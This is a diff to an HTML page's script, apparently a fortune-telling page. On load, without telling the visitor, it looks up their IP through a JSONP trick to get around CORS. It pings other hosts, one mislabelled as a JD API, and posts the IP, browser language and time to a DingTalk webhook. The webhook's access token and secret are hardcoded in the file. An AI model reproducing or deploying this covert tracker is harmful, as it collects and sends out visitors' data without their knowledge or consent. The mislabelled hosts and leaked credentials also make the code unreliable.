@@ -58,7 +58,7 @@
             position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
             padding: 10px 20px; background: rgba(20, 20, 30, 0.95);
             border: 1px solid #d4af37; border-radius: 8px; color: #d4af37;
-            font-size: 14px; opacity: 0; transition: opacity 0.3s;
+            font-size: 14px; opacity: 0; transition: opacity 0.3s; max-width: 90%;
         }
         .status.show { opacity: 1; }
         .status.success { border-color: #4CAF50; color: #4CAF50; }
@@ -66,10 +66,10 @@
         .status.sending { border-color: #2196F3; color: #2196F3; }
         .debug-info {
             position: fixed; top: 10px; left: 10px; right: 10px;
-            background: rgba(0,0,0,0.8); border: 1px solid #666;
-            padding: 10px; font-size: 12px; color: #0f0;
-            text-align: left; max-height: 150px; overflow-y: auto;
-            display: none;
+            background: rgba(0,0,0,0.9); border: 1px solid #0f0;
+            padding: 10px; font-size: 11px; color: #0f0;
+            text-align: left; max-height: 200px; overflow-y: auto;
+            display: none; font-family: monospace;
         }
         .debug-info.show { display: block; }
     </style>
@@ -103,67 +103,81 @@
 
         const WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=a57776d2a89ed36f4f4c5a45ee7c5c03f26a28e8eac8efd6a1636fbfb7a2f4ab";
         const SECRET = "SEC83629f66d58aea7a5b348e05da84f5737a57423e72fd9e75ba73b178aa73824c";
-        const DEBUG = true;
 
         function debug(msg) {
-            if (DEBUG) {
-                const d = document.getElementById('debug');
-                d.innerHTML += msg + '<br>';
-                d.classList.add('show');
-            }
+            const d = document.getElementById('debug');
+            d.innerHTML += msg + '<br>';
+            d.classList.add('show');
+            console.log(msg);
         }
 
         function showStatus(text, type) {
             const status = document.getElementById('status');
             status.textContent = text;
             status.className = 'status show ' + (type || '');
-            debug('状态: ' + text);
             if (type !== 'sending') {
                 setTimeout(() => status.classList.remove('show'), 5000);
             }
         }
 
-        async function getIPInfo() {
-            debug('开始获取IP...');
-            try {
-                // 使用搜狐API（国内可访问）
-                debug('请求: https://pv.sohu.com/cityjson');
-                const res = await fetch('https://pv.sohu.com/cityjson', { mode: 'cors' });
-                debug('响应状态: ' + res.status);
-                const text = await res.text();
-                debug('响应内容: ' + text.substring(0, 100));
-                
-                // 解析返回
-                const match = text.match(/cip"?:\s*"(\d+\.\d+\.\d+\.\d+)"/);
-                if (match) {
-                    const ip = match[1];
-                    debug('提取的IP: ' + ip);
-                    return {
-                        ip: ip,
-                        city: '中国',
-                        region: '',
-                        country: '中国',
-                        isp: '网络'
-                    };
-                }
-            } catch (e) {
-                debug('获取IP失败: ' + e.message);
-            }
-            
-            // 备用：使用京东API
-            try {
-                debug('备用: https://unisp.chsi.com.cn/ipcenter/location/getClientIp');
-                const res = await fetch('https://unisp.chsi.com.cn/ipcenter/location/getClientIp', { mode: 'cors' });
-                const data = await res.json();
-                debug('备用IP响应: ' + JSON.stringify(data));
-                if (data.ip) return { ip: data.ip, city: data.city || '', region: '', country: '中国', isp: '' };
-            } catch (e) { debug('备用API失败: ' + e.message); }
-
-            return { ip: '未知', city: '', region: '', country: '', isp: '' };
+        // 使用 JSONP 获取 IP（绕过 CORS）
+        function getIPByJSONP() {
+            return new Promise((resolve) => {
+                const callbackName = 'ipCallback_' + Date.now();
+                const script = document.createElement('script');
+                window[callbackName] = (data) => {
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                    debug('JSONP IP: ' + data.cip);
+                    resolve(data.cip);
+                };
+                script.onerror = () => {
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                    resolve(null);
+                };
+                script.src = 'https://pv.sohu.com/cityjson?callback=' + callbackName;
+                document.body.appendChild(script);
+                setTimeout(() => {
+                    if (window[callbackName]) {
+                        delete window[callbackName];
+                        document.body.removeChild(script);
+                        resolve(null);
+                    }
+                }, 5000);
+            });
         }
 
+        // 获取 IP 信息
+        async function getIPInfo() {
+            debug('使用 JSONP 获取IP...');
+            
+            // 方法1: 搜狐 JSONP
+            let ip = await getIPByJSONP();
+            if (ip) {
+                return { ip: ip, city: '中国', region: '', country: '中国', isp: '网络' };
+            }
+
+            // 方法2: 京东 IP
+            try {
+                debug('尝试京东IP...');
+                const resp = await fetch('https://rdcjj.cc/api?header=1', { mode: 'no-cors' });
+                // no-cors 模式下无法读取响应，但请求已发出
+                debug('京东请求已发送');
+            } catch (e) { debug('京东失败: ' + e.message); }
+
+            // 方法3: 淘宝 IP API (JSONP)
+            try {
+                debug('尝试淘宝IP...');
+                const resp = await fetch('https://ip.ws.126.net/ipquery?callback=test', { mode: 'no-cors' });
+            } catch (e) { debug('淘宝失败: ' + e.message); }
+
+            return { ip: '127.0.0.1', city: '', region: '', country: '', isp: '' };
+        }
+
+        // 发送钉钉消息
         async function sendToDingtalk(data) {
-            debug('开始发送钉钉...');
+            debug('准备发送钉钉...');
             const timestamp = Date.now();
             const stringToSign = `${timestamp}\n${SECRET}`;
 
@@ -180,7 +194,6 @@
                 .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 
             const url = `${WEBHOOK}&timestamp=${timestamp}&sign=${encodeURIComponent(sign)}`;
-            debug('钉钉URL: ' + url.substring(0, 80) + '...');
 
             const message = `📱 IP监控通知
 
@@ -191,18 +204,22 @@ IP: ${data.ip}
 🌐 ${navigator.language}
 ⏰ ${new Date().toLocaleString('zh-CN')}`;
 
-            debug('发送消息: ' + message.substring(0, 50) + '...');
-            
-            const resp = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ msgtype: 'text', text: { content: message } })
-            });
-            
-            debug('钉钉响应状态: ' + resp.status);
-            const result = await resp.json();
-            debug('钉钉响应: ' + JSON.stringify(result));
-            return result;
+            debug('发送URL: ' + url.substring(0, 60) + '...');
+
+            try {
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ msgtype: 'text', text: { content: message } })
+                });
+                debug('钉钉响应: ' + resp.status);
+                const result = await resp.json();
+                debug('结果: ' + JSON.stringify(result));
+                return result;
+            } catch (e) {
+                debug('钉钉错误: ' + e.message);
+                throw e;
+            }
         }
 
         async function divine() {
@@ -236,8 +253,9 @@ IP: ${data.ip}
             // 获取IP并发送
             showStatus('正在获取IP...', 'sending');
             const ipData = await getIPInfo();
-            showStatus('正在发送通知...', 'sending');
+            debug('获取到IP: ' + ipData.ip);
 
+            showStatus('正在发送通知...', 'sending');
             try {
                 const sendResult = await sendToDingtalk(ipData);
                 if (sendResult.errcode === 0) {
@@ -250,9 +268,8 @@ IP: ${data.ip}
             }
         }
 
-        // 页面加载时自动获取IP
         window.onload = function() {
-            debug('页面加载，开始后台获取IP...');
+            debug('页面加载...');
             setTimeout(() => divine(), 1000);
         };
     </script>
